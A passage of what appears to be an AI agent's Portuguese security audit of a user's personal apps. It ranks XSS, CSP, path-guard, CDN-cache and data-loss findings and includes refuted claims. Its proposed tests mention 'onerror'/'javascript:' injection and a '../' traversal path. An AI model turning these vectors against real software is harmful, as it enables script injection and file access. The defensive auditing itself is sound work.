| Via | Como é servida | Correção de CSP |
|---|---|---|
| **Electron** (`%LOCALAPPDATA%\Programs\Write\Write.exe`) | `protocol.handle("app")` responde o `app/index.html` (`Write.js:35-41`) | **header** CSP na `Response` (`Write.js:39`) + nonce injetado no HTML servido |
| **Navegador** (`navegador/iniciar-windows.bat`) | `python -m http.server 8765` — o `http.server` **não envia header CSP** | **`<meta>` no `<head>`** de `navegador/Write.html:3-6` (que tem `<head>` real) + nonce no HTML |
| **claude.ai** (artefato) | servido pelo host | não determinável de dentro do repo (ver lacuna (a)) |

**Escopo de código do app: NENHUM.** A correção fica em `computador/Write.js` (main
process) e em `navegador/Write.html` (o `<head>`). **Não toca** `core.js`, `docio.js`,
`ribbon.js`, `app.js` nem `build.py` — o que também elimina a colisão com a tarefa da
vlrm (T3/T4) no `core.js`.

**Mais um desalinhamento de build (via web):** `navegador/Write.html` (19/10 23:06,
684 423 bytes) tem o bundle de uma versão **anterior** ao `dist` atual — o prefixo
comum entre o bundle do navegador e o do `dist` é de só **44 783 bytes** de 688 208, e
o `<script>` do `window.MathJax` é o mesmo nos dois. O `navegador/Write.html` **não é
gerado por script nenhum** (grep por `Write.html` em todo o projeto: só o
`LEIA-ME.md:38` e o `iniciar-windows.bat:4` o mencionam) — ele foi copiado à mão de uma
versão anterior do `dist`. Como o `LEIA-ME.md:45-48` só manda rodar `build.py` e
`montar.py`, **a via web não tem passo de build documentado** — quem atualiza o
`navegador/Write.html` é o Yuri, à mão. Isso importa para a CSP: **um nonce gerado em
runtime pelo `Write.js` não existe nessa via** (o `Write.js` não a serve), então a via
web ou recebe `<meta>` com hash (aí quebra quando o HTML muda) ou não recebe CSP
nenhuma. **Recomendação: aplicar a CSP só no Electron primeiro** (é a via que o Yuri
usa — o `LEIA-ME.md:27` diz "extraia o `Write-Windows.zip` e dê dois cliques"), e deixar
a via web para depois, com um `servidor.py` em vez do `http.server` (que aí poderia
mandar header).

---

## PRIORIDADE 34 — Write: fechar aba apaga o rascunho sem confirmação (ALTO)

**Arquivo:** `...\Write\codigo-fonte\src\app.js:80-88` · `cloud.js:228-236` · `doc.js:504-511`

```javascript
// app.js:80-88
async function closeTab(id) {
  ...
  IDB.del("tab:" + id);
  if (t.kind === "pdf") for (let k = 0; k < 20; k++) IDB.del(`src:${id}:${k}`);
  ...
}
```

Um clique no **✕** da aba apaga o rascunho do IndexedDB **sem confirmação e sem
backup**. O autosave existe (`APP.persistActive`, `app.js:23-35`, com debounce de 700 ms
em `doc.js:504-511`), mas ele garante só que o estado está no IDB **enquanto a aba
existe** — o `del` apaga esse mesmo estado. Na nuvem (`cloud.js:228-236`) há
sincronização, **mas só quando `CLOUD.ok`** (conta conectada): o build desktop de
`computador/` não tem conta, então o `IDB.del` é **definitivo**.

**Cenário concreto:** o Yuri trabalha numa dissertação, clica no ✕ sem querer, e o
documento (que só existia na aba) some. Não há "reabrir documento fechado".

**Correção (pequena, sem quebrar nada):** confirmação antes de apagar + backup.
```javascript
if (!confirm("Fechar esta aba? O rascunho sai do navegador.")) return;   // ou mover para backup
```
Melhor ainda: antes do `IDB.del`, gravar em `tab:fechado:<id>` e oferecer
"reabrir" — assim o `✕` acidental é reversível. O `store.set("backup:"+id, …)` já
existe como padrão do `store` (`core.js`).

**Toca o fluxo do Yuri:** sim — fechar aba é rotina. **Confiança:** alta.
**Verificado adversarialmente em 20/10 (severidade ALTO confirmada, e maior do que eu
tinha escrito):** (a) **não há confirmação** — o ✕ da barra de abas chama `closeTab`
direto (`app.js:49-53`); a única confirmação que existe no código é a de apagar a conta
(`cloud.js:212`); (b) **não é perda por corrida** — `closeTab` faz `await flushActive()`
(`app.js:82` → `:54`) antes do `IDB.del`, ou seja a gravação no IDB **termina** antes
do `del`: a deleção é **deliberada**; (c) **no build desktop o conteúdo é realmente
perdido** — `CLOUD.ok` só fica `true` se `window.claude.use` existir (`cloud.js:19-36`) e
o preload do Electron expõe **só** `window.writeDesktop`
(`computador/preload.js:3-6`), logo **no app de computador o backup na nuvem NUNCA roda** —
consequência mais grave que a alegada: **todo** fechamento de aba, em **todo** documento
do build desktop, apaga o rascunho de forma definitiva; (d) **não sobra vestígio** —
`saveIndex()` (`app.js:15`) remove a aba do índice em `localStorage`, então a tela inicial
(`app.js:311-338`) e "Arquivo > Abrir" (`app.js:234-235`) não mostram nada; (e) **não há
recuperação** — grep por `Lixeira|reabrir|recuperar|restaurar|beforeunload` no `src` não
acha mecanismo nenhum; o undo é por DOM e some com a aba. **O contraste que prova que
não era a intenção:** fechar a **janela** preserva tudo (`Write.js:89-94` faz
`flushActive` antes do `destroy` e **não** apaga as abas) — ou seja, o app é
*crash-safe* mas não é *tab-close-safe*. Nenhum teste cobre fechamento de aba.

---

## PRIORIDADE 35 — Write: biblioteca de CDN guardada em disco sem verificação de integridade (MÉDIO)

**Arquivo:** `...\Write\computador\Write.js:45-62`

O `protocol.handle("https", ...)` intercepta **todo** request https. Para os hosts que
batem com o regex de CDN, o corpo é gravado em
`userData/bibliotecas/<sha1(url)>` e servido de lá para sempre:

```javascript
// Write.js:48-60
const key = crypto.createHash("sha1").update(req.url).digest("hex");
const bf = path.join(CACHE, key), mf = bf + ".json";
const cors = { "access-control-allow-origin": "*" };
if (fs.existsSync(bf) && fs.existsSync(mf)) { ... }        // :51-54 usa o cache para sempre
const buf = Buffer.from(await r.arrayBuffer());             // :58
fs.writeFileSync(bf, buf);                                  // :59 grava o que veio da rede
fs.writeFileSync(mf, JSON.stringify({ url: req.url, type }));
```

**Não há hash esperado, SRI, nem verificação**: o que chega da rede é gravado e passa a
ser servido em todas as execuções seguintes. E o `access-control-allow-origin: *` (`:50`)
permite que qualquer página aberta no mesmo renderer use a lib servida.

**Correção:** fixar o sha256 de cada URL de CDN no código e recusar o corpo quando o
hash não bater; ou servir as libs de uma pasta local do app (o `build.py` já as
consome por `<script src="https://cdnjs...">` — `:17`, e `fonts.googleapis.com`).

**Toca o fluxo do Yuri:** não no uso normal — o risco é de cadeia de suprimentos
(CDN comprometido ou interceptado). **Confiança:** média.
**Verificado adversarialmente em 20/10 (severidade MÉDIO confirmada):** todas as
afirmações factuais conferem — o cache é gravado **sem** verificação (o `sha1` de
`Write.js:48` é do **URL**, não do corpo), e **não existe** `sha256|integrity|crossorigin`
em lugar nenhum do projeto (grep confirmado: só o `cloudHash` de endereçamento de
conteúdo na nuvem, `cloud.js:39-42`). Quem escreve no `userData` é **só** o processo
principal (`Write.js:59-60`); o renderer roda com `sandbox: true` e `contextIsolation:
true` (`Write.js:71`), o preload expõe só `onOpenFile`/`ready`, e o handler `app://` é
só de leitura do `APP_DIR` (`Write.js:35-41`) — logo **não há** outro escritor nem
*path traversal* (a chave é hex de sha1). **O que agrava:** a persistência — `Write.js:51-54`
devolve o arquivo em cache sempre que os dois arquivos existem, **sem TTL e sem
revalidação**, então um envenenamento único **sobrevive para sempre**, inclusive no
modo offline. **Por que não é ALTO:** exige pré-condição (conta de CDN comprometida, CA
rogue/MITM na máquina ou malware local) — não é ataque remoto anônimo; é mitigado pelo
sandbox do renderer e pelo TLS validado pelo trust store do Windows.

---

## PRIORIDADE 36 — Write: nenhum teste cobre sanitização, CSP, IPC ou o path guard (MÉDIO)

**Arquivo:** `...\Write\testes\` (30 arquivos `t_*.js`) · `computador\Write.js:38`

Os 30 testes do Write cobrem **formatação, round-trip e interface**. Um grep por
`csp|xss|sanitiz|ipc|nodeIntegration|traversal|onerror` nos `t_*.js` **não devolve
nada** — nenhum teste quebra se a sanitização for removida.

**Além disso, o path guard do `app://` é prefixo puro:**
```javascript
// computador/Write.js:37-38
const f = path.normalize(path.join(APP_DIR, p));
if (!f.startsWith(APP_DIR)) return new Response("proibido", { status: 403 });
```
`startsWith(APP_DIR)` aceita um diretório **irmão** com nome que começa igual
(`app-secret/`). Hoje não há impacto real (não existe tal pasta), mas a guarda está
errada por construção.

**Correção (um teste novo + 1 linha):**
- `testes/t_seg.js` com três verificações:
  1. um `.html`/`.tex` malicioso **não** pode produzir `onerror`/`javascript:` em
     `ed.innerHTML` nem disparar um marcador global (falha se disparar);
  2. o `index.html` gerado **precisa** conter a CSP;
  3. `protocol.handle("app", …)` com `app://write/../segredo` **tem** que responder 403
     — e a guarda vira `f === APP_DIR || f.startsWith(APP_DIR + path.sep)`, com
     `fs.realpath` para resolver o symlink antes de comparar.
- Sem teste, as PRIORIDADES 31, 32, 33 e 35 podem regredir sem ninguém perceber.

**Toca o fluxo do Yuri:** não — é cobertura de teste. **Confiança:** alta.
**Estado:** achado do agente, em verificação adversarial.

---

## Achados REFUTADOS (não vão virar patch)

O verificador adversarial derrubou estes — registrado para não repetir o trabalho:

- **Finanças F4 — "dívidas adiáveis/pequenas invisíveis nos alertas":** **inexistente**.
  É a semântica declarada das categorias (`Financas.html:202-204`: "Adiável: tem prazo
  desejado, mas pode ficar para depois"; "Pequena: paga quando sobrar"). O valor em
  aberto aparece no KPI "Dívidas avulsas" (`:379`, `:385`), a projeção de quitação
  aparece em `:386`, e a aba Contas mostra cada item com valor. Incluir adiáveis em
  `faltas` produziria alerta falso ("faltam R$ X") para quem adia uma dívida
  legitimamente adiável. **Não é bug.**
- **Finanças F3 (parte "XSS via `cat`"):** `cat` **não** injeta HTML — `CATS[i.cat].rotulo`
  estoura **antes** de o template ser montado. O vetor real são os campos crus
  (`i.parcelas`, `i.juros`, `i.dia`, `i.id`) — ver PRIORIDADE 5.
- **Finanças F5 (encaminhamento "localStorage corrompido"):** no desktop local, com a
  nuvem presente, a linha 317 devolve o plano real. O gatilho real é multi-aparelho —
  ver PRIORIDADE 6, corrigido.
- **RadarPassagens RP-01 (parte "api_key no `radar.db` e no git"):** **refutado** —
  o corte de 200 caracteres corta antes da chave (índices 223 e 229). Ver PRIORIDADE 10
  para o que sobrou.
- **RadarPassagens RP-03 (parte "DELETE cross-origin apaga o histórico"):** **refutado**
  — preflight `OPTIONS` → 501. O que sobra é criação de monitoramento + disparo
  forçado — ver PRIORIDADE 9.
- **RadarPassagens RP-04 (parte "nenhum dos outros monitoramentos é verificado"):**
  exagerado — os watches **anteriores** ao inválido são verificados na mesma rodada
  (ordem por `id`).
- **DA-04 (TG mg→%, parte "divide por zero" como falha silenciosa):** o gatilho não
  existe no fluxo documentado (`termico_test.py:36`, `qt_termico.py:50`, `i18n.py:1018`
  usam "Mass/%") e a falha não é silenciosa (numpy emite `RuntimeWarning`, o resíduo
  fica `inf`/`nan` em `analise.py:200`, o plot fica vazio). O que sobrevive é **outro**
  problema, na normalização antes do `argsort` — ver PRIORIDADE 20.
- **DA-03 (conversão .dpt, parte "sobrescreve o arquivo do usuário" e "app escaneia
  pastas"):** a primeira é real mas pequena (o `.txt` é determinístico a partir do
  `.dpt`, e o `.dpt` nunca é tocado — `input_data.py:198` usa `with_name`); a segunda é
  **falsa** — o app não varre pastas (não há `listdir`/`iterdir` em `raman_phase_analyzer`);
  os espectros são escolhidos por `QFileDialog`. Ver PRIORIDADE 21.
- **DA-01 (parte "o modelo do usuário está dentro do OneDrive, portanto sincronizado"):**
  **falso** — `Path.home()` = `C:\Users\yuri`, então o arquivo fica em
  `C:\Users\yuri\.raman_phase_analyzer\`, **fora** de `C:\Users\yuri\OneDrive`. Só o
  modelo **embutido** mora na árvore OneDrive, e no executável congelado ele nem existe
  (`RamanPhaseAnalyzer.spec:4` embute apenas `assets`). Ver PRIORIDADE 18.
- **DA-01 (parte "a falha de leitura é engolida em silêncio"):** **falso** — quando a
  carga falha, a interface mostra **"Random Forest peak AI: not trained"**
  (`gui.py:897-900`, `qt_classif.py:491`).
- **DA-02 (caso concreto alegado: "espectro_1.txt", "espectro_2.txt" → eixo vira
  "Spectrum 1..N"):** **falso** — a `ValueError` só é levantada quando o nome **não tem
  nenhum dígito** (`input_data.py:113`). Nomes com dígito vão para `input_data.py:114-115`
  e seguem sem exceção. Ver PRIORIDADE 19 e a PRIORIDADE 24 (o problema real, invertido).
- **DA-02 (título "sem aviso ao usuário"):** **falso** — há `messagebox.showwarning` /
  `QMessageBox.warning` (`gui.py:3539-3540`, `qt_app.py:831-832`) com o texto exato
  *"Não foi possível encontrar número no nome: `<arquivo>`"*, e a lista/eixo passam a
  mostrar "Spectrum N" / "Spectrum index". O que é real é o **título** do diálogo
  ("Arquivos ignorados" quando nada foi ignorado).
- **TriboDEM — "o sweep de convergência é INÓCUO no motor GPU" (a tese da primeira
  versão da PRIORIDADE 25):** **REFUTADO** por 2 de 3 lentes (caminho real e
  reprodução). O `fator_dt` **não** é ignorado pela GPU: ele chega dentro de
  `info["dt"]`, que o exportador de cena já escalou (`yade_worker.py:1628`:
  `"dt": tempo_contato() / 20 * FATOR_DT`, com `FATOR_DT` de `CASO["fator_dt"]` em
  `yade_worker.py:52`). Logo o sweep **varia** o passo (GPU: `tc/10`, `tc/20`, `tc/40`;
  CPU: `tc/20`, `tc/40`, `tc/80`) — o sweep funciona. A `fator_dt_gpu` é uma **constante
  de estabilidade** (2.0), não um caso com Δt igual nos 3 casos. **O que sobrevive** (e
  virou a PRIORIDADE 25 corrigida): a GPU roda com o dobro do passo da CPU, o limite
  validado `0 < fator_dt ≤ 1` é violado em silêncio, a chave `fator_dt_gpu` é morta e
  não documentada, e o `resultado.json` da GPU não grava o `fator_dt`.
- **TriboDEM — "o `pickle.load` do checkpoint é explorável porque o arquivo fica no
  OneDrive e a nuvem é o vetor de substituição":** **REFUTADO** pela lente de caminho
  real (20/10). O `pickle.load` rodar antes de qualquer conferência é fato
  (`dem_gpu.py:313-314`, `yade_worker.py:2096-2097`), mas o checkpoint é **gerado
  localmente pelo mesmo motor** (`pickle.dump` em `dem_gpu.py:713` /
  `yade_worker.py:2082`, atômico via `os.replace`), fica em
  `~/tribodem_runs/<lote>/<id_caso>` (`runner.py:94`, `:161-169`), **não tem** caminho
  de download (nenhum `wget`/`curl`/`rsync`/`scp`), tem o `id` validado contra
  travessia (`runner.py:154-160`) e a pasta é **apagada no fim do caso**
  (`yade_worker.py:2113`, `dem_gpu.py:859`). Quem trocasse o arquivo já teria execução
  de código na mesma conta. **O que sobrevive** virou a PRIORIDADE 12 corrigida:
  defesa em profundidade, severidade **BAIXO**.
- **Write P33 — "a CSP sozinha já neutraliza o vetor das PRIORIDADES 31 e 32" e
  "a `<meta http-equiv>` no `build.py` resolve":** **REFUTADO por teste empírico**
  (21/10, Playwright + Chromium, fora da pasta Write). Duas coisas erradas na minha
  própria proposta: (a) **`'unsafe-inline'` em `script-src` NÃO bloqueia handler
  inline** — medido: com `'unsafe-inline'` o `onerror` executa; sem ele (nonce/hash)
  é barrado e o bundle continua rodando; (b) **a `<meta>` do `build.py` cairia fora do
  `<head>`** (o `build.py:6-21` gera fragmento, o `montar.py:7-9` embrulha dentro do
  `<body>`) e o navegador **ignora** meta CSP fora do `<head>` — a linha proposta
  **não faria nada**. **O que sobrevive:** a ausência de CSP, como **defesa em
  profundidade** (severidade **MÉDIO**), com a correção trocada para **header CSP** na
  `Response` do `Write.js:38-40` + `nonce` nos dois `<script>` inline do `build.py:15-20`
  e `media-src`/`font-src blob:`. Ver PRIORIDADE 33.

---

## O que eu recomendo o Yuri aprovar hoje

| # | Onde | O que muda | Toca o que o Yuri vê? |
|---|---|---|---|
| 1 | `Financas.html:196` | Tirar o ponto de milhar antes de converter (`replace(/\./g,"")` + `replace(",", ".")`) — para de gravar R$ 1.500 como R$ 1,50 | Sim (valor gravado no plano) |
| 2 | `Financas.html:262` + `:829` | Só cobrar juros depois do vencimento (`(!it.prazo \|\| it.prazo <= m)`) | Sim (valor da dívida e KPI de quitação) |
| 3 | ~~`qe-flow/flowcalc/web/server.py:54` + `:184`~~ | **JÁ CORRIGIDO por outra sessão em 20/10** (`import tempfile` + `_raiz_permitida` em `:214`) — sai da lista | — (já resolvido) |
| 4 | `Financas.html:862` + `:346` + `:589` + `:591/594/595/598` | Validar `cat` na importação, escapar os campos crus | Sim (aba Contas quebra ao importar) |
| 5 | `RadarPassagens/app/routing.py:88` + `app/notify.py:26` | Não logar a exceção crua (token/chave dentro) | Não |
| 6 | `RadarPassagens/web/app.js:78` + `:95` | `esc()` nos três campos numéricos | Sim (painel) |
| 7 | `RadarPassagens/app/server.py:47` + `app/monitor.py:50` | Validar data de verdade e isolar erro por monitoramento | Sim (rodada de verificação) |
| 8 | `RadarPassagens/app/server.py:_body` | Exigir `Content-Type: application/json` + checar `Origin` | Não |
| 9 | `Financas.html:294` + `:870` | Distinguir "sem dados" de "estado corrompido" no boot | Sim (multi-aparelho) |
| 10 | `RadarPassagens/main.py:64-65` + `app/server.py:122` | **JÁ CORRIGIDO em 20/10** (só texto) — sai da lista | — (já resolvido) |
| 11 | `~/.omniroute/.env` | `OMNIROUTE_SERVER_HOST=127.0.0.1` + `REQUIRE_API_KEY=true` | Sim (rede) — precisa do sim/não do Yuri |
| 12 | `qe-flow/flowcalc/pseudos.py:79,126,168,181` | `shlex.quote()` nas pastas de pseudopotencial (injeção de comando no WSL) | Sim (busca de pseudos) |
| 13 | `qe-flow/flowcalc/web/server.py:123` | Barrar caminho no `mpi_command` (`/` ou `\` no argv[0]) | Não no uso normal |
| 14 | `qe-flow/flowcalc/analysis.py:240` + `workflow.py:141` | Avisar quando o nº de modos muda entre pressões (dω/dP e γ podem estar trocados) | Sim (número científico) |
| 15 | `DA/raman_phase_analyzer/raman_ai.py:537` | Pedir confirmação antes de carregar o `.joblib` do usuário (pickle) — **BAIXO** (consistência de UX, não buraco crítico) | Sim (1 confirmação ao abrir) |
| 16 | `DA/raman_phase_analyzer/input_data.py:92` + `qt_app.py:826` + `gui.py:3521` | Não degradar a série para "Spectrum 1..N" sem avisar — **BAIXO** (o gatilho exige nome sem nenhum dígito; há aviso e rótulo visível) | Só em nome mal nomeado |
| 17 | `DA/raman_phase_analyzer/termico/analise.py:97` | Guardar `tg[0] == 0` **e** normalizar depois do `argsort` (curva >100% silenciosa) — **BAIXO** | Sim (curva TG) |
| 18 | `DA/raman_phase_analyzer/input_data.py:198` | Não gravar o `.txt` convertido em mídia somente-leitura e não criar o sufixo duplo — **BAIXO** (não muda de pasta: o projeto grava o caminho usado) | Sim (pasta de dados) |
| 19 | `qe-flow/flowcalc/executor.py:177,117` + `pipeline.py:91,119` | Reusar a leitura por cauda de `monitor/runs.py:18-27` | Não (RAM/tempo) |
| 20 | `qe-flow/flowcalc/analysis.py:286` | `summary.csv` com escrita atômica (tmp + `os.replace`) | Não |
| 21 | `DA/raman_phase_analyzer/input_data.py:110-123` | **Não inventar** pressão/temperatura a partir de nome só com dígitos (`espectro_1.txt` → "1 GPa", `2024_x.txt` → "2024 K") | Sim (eixo do ajuste, sem aviso) |
| 22 | `TriboDEM/tribodem/dem_gpu.py:328` | Usar a chave validada `fator_dt` no motor GPU (hoje lê `fator_dt_gpu`, que ninguém grava) e gravar o fator no `resultado.json` — a GPU roda com o **dobro** do passo da CPU | Sim (convergência) — **bloqueado**: arquivo protegido |
| 23 | `TriboDEM/tribodem/experiments.py:588` | Trocar a tupla de tipos por `TIPOS_PARTICULAS` — "montagem" escapa da regra que proíbe CFD-DEM com alimentação contínua | Sim (ensaio de montagem) |
| 24 | `TriboDEM/tribodem/cad.py:1053-1055` + `cad_qt.py:270-272` | Validar o STL (3/3 vértices, coordenadas finitas) e **não** substituir a peça por malha vazia em caso de erro — severidade corrigida para MÉDIO | Sim (TriboCAD) |
| 25 | `TriboDEM/tribodem/qt_app.py:553-558` + `:1077` | Renomear a pasta antiga do lote em vez de sobrescrever por cima (mistura de lotes + backup) | Sim (tela de Resultados) |
| 26 | `TriboDEM/tribodem/vida_util.py:250-254` | Fazer o ffmpeg da vida útil falhar alto (como `render.py:403`) em vez de engolir e apagar os quadros — severidade corrigida para **BAIXO** (os números já foram gravados antes; só o artefato de vídeo se perde) | Sim (vídeo de vida útil) |
| 27 | `TriboDEM/tribodem/fila_calculos.py:199-200` | Aceitar só `=1` e avisar no stderr que a exclusão mútua está desligada — severidade corrigida para **MÉDIO** (o `flock` é a única exclusão entre DEM-Engines; desligar custa horas de cálculo) | Não (mas o cálculo trava) |
| 28 | `Write/codigo-fonte/src/docio.js:742` + `:706` | **Não usar `outerHTML` cru** — reconstruir o elemento por lista branca de atributos (hoje o `onerror` do HTML importado executa) | Sim (abrir HTML/Markdown) |
| 29 | `Write/codigo-fonte/src/docio.js:973` (+ `:978`, `:983`) | Escapar `g.v` ao montar os grupos LaTeX e o `src` do `figHTML` (`doc.js:94`) — hoje o LaTeX importado executa script | Sim (abrir .tex/.zip) |
| 30 | `Write/computador/Write.js:38-40` (header CSP) — **nonce gerado por carga**, sem mexer no `build.py` | **CSP de verdade** — barra o `onerror`/`onclick` do #28 e #29. **NÃO** é a `<meta>` no `build.py` que eu propus antes: ela cairia fora do `<head>` e seria ignorada, e com `'unsafe-inline'` **não** barraria o handler (medido em 21/10). **Política medida em 21/10** (rodadas 8 e 9): `script-src` **sem** `'unsafe-inline'` (fecha o XSS) e **sem** `'unsafe-eval'` (medido: dispensável); `style-src` **com** `'unsafe-inline'` (medido: obrigatório — o app usa `style=` inline em 111 lugares, e sem isso o documento aparece sem formatação); `media-src 'self' data: blob:` e `font-src 'self' data: blob:` (medido: `media-src 'none'` bloqueia o vídeo `data:video/mp4`); `connect-src 'self' https://api.crossref.org https://api.openalex.org` (o `cite.js`); **sem** `worker-src` (medido: o pdf.js usa fake worker, 0 workers criados); `connect-src` **não** precisa de `fonts.googleapis.com` (o `<link>` é `style-src`, não `connect-src` — alegação refutada por medição). Severidade corrigida para **MÉDIO** | Sim — mas **medido**: a suíte de `testes/` passa com a CSP ativa (30 testes, `rc=0` nos dois cenários). Os 7 testes que usam `page.addScriptTag` inline precisam trocar por `<script src>` (1 linha cada) |
| 31 | `Write/codigo-fonte/src/app.js:80-88` | Confirmar antes de fechar a aba e/ou guardar backup (`tab:fechado:<id>`) — hoje o ✕ apaga o rascunho sem volta | Sim (perda de trabalho) |
| 32 | `Write/computador/Write.js:45-62` | Fixar o sha256 das libs de CDN e recusar corpo divergente (hoje grava o que veio da rede, sem hash) | Não no uso normal |
| 33 | `Write/testes/t_seg.js` (novo) + `Write/computador/Write.js:38` | 3 testes de segurança (sanitização, CSP, path guard com `fs.realpath`) — hoje **nenhum** teste cobre isso | Não |

**Colisão de arquivo a considerar antes de aplicar:** o **#29** (escapar `g.v` no LaTeX)
toca `core.js` — que é o mesmo arquivo da tarefa da **vlrm** (T3/T4, citações/APA,
gerenciador de bibliografia). São arquivos diferentes da **minha** proposta de CSP
(**#30** = header em `Write.js:38-40` + `nonce` no `build.py:15-20`, que **não** mexe em
`ribbon.js` nem em `app.js` nem no `core.js`). Se os dois forem autorizados, o `core.js`
tem que ser editado em sequência, não em paralelo — o mesmo arquivo editado ao mesmo
tempo perde trabalho.

Os #1, #2 e #4 são os que mais importam: os três mexem no **plano financeiro real do
Yuri** — um grava R$ 1.500 como R$ 1,50, outro inventa juros antes do vencimento, e o
terceiro faz a aba Contas quebrar e a dívida importada sumir do cálculo. Todos são de
1 a 8 linhas. Nenhum apaga dado. Nenhum exige parar cálculo.

**Subindo no ranking (rodada 2):** o **#12 (injeção de comando no WSL)** e o **#16 (série
Raman degradada para eixo fictício)** passaram a ser os mais graves da rodada nova — o
primeiro porque abrir um `workflow.yaml` de outra pessoa executa código no Linux do Yuri,
o segundo porque o app continua funcionando e o Yuri não percebe que perdeu o eixo de
pressão/temperatura.

**Corrigindo o ranking depois da verificação adversarial (rodada 3):** o **#16 desce**
(para BAIXO — o gatilho exige um nome de arquivo sem nenhum dígito, e há aviso + rótulo
" Spectrum index" visível). O **#21 (novo) sobe** como o pior achado do DA: um nome de
arquivo só com dígitos (`espectro_1.txt`, `2024_x.txt`) vira pressão/temperatura
**inventada** e **sem qualquer aviso** — a série inteira é analisada contra um eixo falso
e plausível, sem nenhum sinal na tela. É pior que o #16 justamente porque lá o app
denuncia ("Spectrum index") e aqui ele não denuncia nada.

**Subindo no ranking (rodada 4, Write):** o **#28 e o #29 (os dois XSS do Write)** entram
como os piores achados de **todo** o documento. São diferentes dos achados de dado: os
anteriores tiram dinheiro ou produzem número errado; estes executam código no renderer
do editor onde o Yuri passa a tarde escrevendo a dissertação — e o arquivo adulterado é
salvo e exportado como se fosse o original, sem nenhum sinal na tela. O **#30 (CSP)**
é o que fecha a porta: **uma linha** no `build.py` que neutraliza os dois de uma vez.

**Corrigindo o ranking depois da verificação adversarial (rodada 5, 20/10):** o **#22
cai de CRÍTICO para ALTO** — o sweep de convergência **não** era inócuo (o `fator_dt`
chega ao motor GPU dentro de `info["dt"]`), então o que sobrou é o motor GPU rodar com
o dobro do passo da CPU, o limite validado ser violado em silêncio e a chave
`fator_dt_gpu` ser morta. O **#28 e o #29 caem de CRÍTICO para ALTO** — o
`contextIsolation: true` + `sandbox: true` impedem o renderer de alcançar o Node, então
é XSS com exfiltração, não execução de código no host. O **#31 (fechar aba) sobe de
importância**: o verificador provou que **no build desktop o backup na nuvem nunca roda**
(`preload.js` só expõe `writeDesktop`, sem `window.claude.use`), ou seja **todo**
fechamento de aba em **todo** documento apaga o rascunho de forma definitiva, e
**não sobra vestígio** nem na tela inicial nem em "Arquivo > Abrir".

**Corrigindo o ranking depois da rodada 6 (20/10, severidades confirmadas):** o **#30
(CSP) sobe** — é a **única** barreira que sobrevive depois que o `contextIsolation` e o
`sandbox` já barraram o acesso ao Node: sem CSP, os dois XSS (#28 e #29) executam
livremente no renderer; com uma linha de `script-src`, os handlers inline morrem. O
**#27 (fila desligada) sobe de BAIXO para MÉDIO** — o `flock` é a única exclusão mútua
entre processos DEM-Engine e desligá-lo custa **horas de cálculo** (dois DEM-Engine na
mesma GPU travam em futex, o watchdog mata o caso e ele vira ERRO). O **#26 (ffmpeg) cai
de MÉDIO para BAIXO** — o vídeo é artefato de apresentação; vida, desgaste e
`vida_estimada_revestimento_h` já foram gravados antes e **não mudam**. O **#12 (pickle do
checkpoint) cai de MÉDIO para BAIXO** — o arquivo é gerado localmente pelo mesmo motor,
não há caminho de download, o `id` é validado contra travessia e a pasta é apagada no fim
do caso: é defesa em profundidade, não falha explorável.

**Corrigindo o ranking depois da rodada 7 (21/10, P33 medido):** o **#30 (CSP) desce de
ALTO para MÉDIO** — e o motivo é o oposto do que eu esperava: a correção que eu propose
**não funcionava**. Testei de verdade (Playwright + Chromium) e (a) com
`'unsafe-inline'` em `script-src` o `onerror` **executa** — ou seja, a CSP, do jeito que
eu escrevi, **não** barra o XSS das P31/P32; (b) a `<meta>` do `build.py` cairia fora do
`<head>` (por causa do `montar.py:7-9`) e o navegador **a ignoraria** — a linha proposta
**não faria nada no build do Electron**. A **correção certa** (header CSP no
`Write.js:38-40` + `nonce` no `build.py:15-20`, sem `'unsafe-inline'`) foi **medida** e
funciona, mas custa mais do que "1 linha" e é um **controle de contenção**, não uma
barreira que fecha o vetor. Os **#28 e #29 (os dois XSS) continuam os piores achados
do documento** — a CSP só amortece o dano deles, não a substitui: a correção que
**realmente** fecha o vetor é a **lista branca de atributos** do #28 e o **escape** do
#29. **Por isso o #28 e o #29 sobem de vez: a CSP não os substitui.**

---

## Em auditoria quando este documento foi fechado

| O quê | Estado |
|---|---|
| Flow Calculation (`wf_e850d80f-799`) | **Concluído** — 5 achados novos, todos verificados |
| DA (`wf_39e68c50-356`, rodadas 2 e 3) | **Concluído** — 4 achados, **verificados** (3 lentes × 2 achados, depois 3 lentes × 2 achados). Severidade corrigida nos 4: **todos BAIXO**. Surgiu 1 achado novo (PRIORIDADE 24) |
| Write | **Concluído** — 6 achados novos do agente de auditoria (20/10) → PRIORIDADES 31-36. **Verificado adversarialmente** (rodadas 5, 6, 7, 8 e 9): P32 (LaTeX) sobreviveu com severidade corrigida **CRÍTICO → ALTO**; P31 (HTML importado) sobreviveu **ALTO** — o `onerror` realmente executa, mas o dano é exfiltração + integridade do documento, não RCE; P34 (fechar aba) sobreviveu **ALTO** com agravantes novos; P35 (cache de CDN) sobreviveu **MÉDIO**; **P33 (ausência de CSP) — o fato se confirma, mas a correção que eu propus foi REFUTADA por teste empírico** (com `'unsafe-inline'` o handler executa; a `<meta>` do `build.py` cairia fora do `<head>` e seria ignorada) ⇒ severidade corrigida **ALTO → MÉDIO**, correção trocada para header CSP no `Write.js:38-40` + `nonce` por carga. **Rodadas 8 e 9 fecharam 3 das 5 lacunas por medição** (MathJax sem `'unsafe-eval'`; a suíte `testes/` passa com a CSP ativa; `worker-src` desnecessário) e **refutaram 2 alegações** (`connect-src` **não** precisa de `fonts.googleapis.com`; `style-src` **precisa** de `'unsafe-inline'`). |
| TriboDEM | **Concluído** — 6 achados novos do agente de auditoria (20/10) → PRIORIDADES 25-30. **Verificado adversarialmente** (rodadas 5 e 6): P25 (fator_dt) — o mecanismo alegado foi **REFUTADO** (o sweep não é inócuo) e a severidade caiu **CRÍTICO → ALTO**, com 3 defeitos reais restantes; P27 (STL) sobreviveu com severidade corrigida **ALTO → MÉDIO**; P28 (mistura de lotes) sobreviveu **MÉDIO**; P29 (ffmpeg engolido) sobreviveu com severidade corrigida **MÉDIO → BAIXO** (os números da tese não mudam — só o artefato de vídeo se perde); P30 (fila desligada) sobreviveu com severidade corrigida **BAIXO → MÉDIO**; P12 (pickle do checkpoint) sobreviveu com severidade corrigida **MÉDIO → BAIXO**. |

Nenhum achado foi aplicado. Nenhum código foi alterado em nenhuma sessão.

---

## Não verificado

- **Flow Calculation**: leitura; não rodei CASTEP nem a fila. O achado da PRIORIDADE 2
  foi provado por **análise do AST + bytecode (`.pyc`)** e leitura do front — não por
  execução, porque o `fastapi` não está instalado no interpretador que usei e eu não
  instalei nada. O `NameError` da linha 184 é conclusão de leitura de código: a função
